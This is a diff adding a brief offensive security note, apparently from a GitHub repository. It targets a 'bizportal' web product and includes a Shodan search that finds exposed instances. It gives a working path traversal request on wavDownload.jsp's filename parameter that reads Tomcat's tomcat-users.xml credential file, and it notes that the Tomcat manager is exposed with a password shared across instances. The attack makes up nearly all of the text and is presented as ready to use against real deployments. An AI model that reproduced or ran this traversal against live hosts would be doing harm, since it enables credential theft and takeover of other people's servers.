@@ -1,0 +1,9 @@
+https://www.shodan.io/search?query=http.html_hash%3A516997337
+
+except the exploitation of the rmi service (see RMIstuffed on this github) i also found some other stuff on this
+
+EZ path traversal on filename parameter in /bizportal/useconfig/wavDownload.jsp allowing file read on web stack (tomcat - user www)
+
+/bizportal/useconfig/wavDownload.jsp?filename=../../../../../../..//usr/local/tomcat5.5/conf/tomcat-users.xml
+
+tomcat manager is exposed  (/manager) the pass is common between intances <:*)
